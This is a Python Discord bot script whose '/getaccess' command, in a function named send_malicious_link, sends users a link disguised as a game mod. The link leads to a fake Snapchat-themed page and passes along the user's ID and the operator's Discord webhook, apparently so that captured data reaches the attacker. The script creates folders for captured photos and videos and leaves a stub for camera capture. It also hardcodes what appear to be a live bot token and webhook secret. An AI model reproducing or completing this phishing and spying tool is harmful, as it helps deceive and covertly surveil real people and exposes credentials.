import discord
from discord.ext import commands
import requests
import cv2
import os

# Replace 'YOUR_DISCORD_BOT_TOKEN' with your actual bot token
DISCORD_BOT_TOKEN = 'MTMyMzcxMjkwMjIxMjg3ODM4OA.GozJtB.Z91i3X25z_6SzpZic2zPyxbToX5KPynPIQS6_s'

# Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1479957368979587073/ErJKs0AtwDGEo60Ba5JtsVnTUR2vCiXFhCHyGAuyY3ZlqCj0HEKroZ-GwHNEFQ02AOyQ'
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():   print(f'Bot has connected to Discord as {bot.user}')

@bot.command(name='getaccess')
async def send_malicious_link(ctx):
    user_id = ctx.author.id
    malicious_link = f"https://kurdish-snap.github.io/snapchat-spotlight/?id=1428690725/access_all?user_id={user_id}&discord_webhook={DISCORD_WEBHOOK_URL}"
    await ctx.send(f"Hey {ctx.author.mention}, check out this awesome game mod! Click here: {malicious_link}")
# Set up a folder to store captured photos and videos
PHOTO_FOLDER = 'photos'
VIDEO_FOLDER = 'videos'

if not os.path.exists(PHOTO_FOLDER):
    os.makedirs(PHOTO_FOLDER)

if not os.path.exists(VIDEO_FOLDER):
    os.makedirs(VIDEO_FOLDER)

def capture_camera(user_id):
    pass

bot.run(DISCORD_BOT_TOKEN)